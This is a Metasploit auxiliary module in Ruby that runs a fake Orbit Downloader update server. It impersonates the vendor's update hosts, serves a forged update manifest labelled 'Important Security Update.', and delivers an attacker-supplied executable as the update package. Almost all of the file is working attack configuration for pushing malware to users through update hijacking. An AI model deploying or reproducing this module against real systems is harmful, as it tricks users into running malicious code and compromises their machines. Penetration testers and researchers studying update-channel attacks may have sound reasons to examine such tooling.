require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Orbit Downloader Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Orbit Downloader updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
				OptString.new('DESCRIPTION',    [ true, "Update description", "Important Security Update." ]),
			], self.class)
		
		@base = {
			'vh' => ['obupdate.orbitdownloader.com', 'www.orbitdownloader.com'],
	    		'request' => [{
				'req' => '/update/', 
				'type' => 'string', 
				'bin'    => '',
				'string' => "[update]\nneed=2\nversion=2.8.1.1\nurl=http://obupdate.orbitdownloader.com/dlup/UpdatePackage2.8.1.exe\nnote=<%DESCRIPTION%>\n",
				'parse' => 1,
				'file' => ''
			},
			{
				'req' => 'update.php', 
				'type' => 'redirect', 
				'to'    => 'http://obupdate.orbitdownloader.com/UpdatePackage2.8.1.exe',		    
				'string' => '',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => '.exe', #regex friendly
				'type' => 'agent', #file|string|agent
				'bin'    => 1,
				'method' => '', #any
				'string' => '',
				'parse' => '',
				'file' => ''
			}
			],
			'options' => {
				'description' => {
					'val' => datastore['DESCRIPTION']
				}
			}
		}
	end
end
